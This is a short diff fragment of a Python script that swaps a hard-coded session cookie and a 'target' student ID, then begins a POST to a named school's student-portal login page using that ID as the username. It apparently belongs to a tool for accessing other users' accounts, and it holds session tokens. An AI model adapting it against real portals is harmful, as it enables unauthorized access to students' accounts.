@@ -4,10 +4,10 @@ import bs4
 import json
 
 COOKIES = {
-    "PHPSESSID": "kcd1mm146u8k4o8d174fk0qbs2"
+    "PHPSESSID": "7keppj07p0ufv93qv7r9uap4f4"
 }
 
-target = "190148"
+target = "190949"
 
 requests.post("https://fystudent.foonyew.edu.my/login.php", data={
     "txt_user": target,
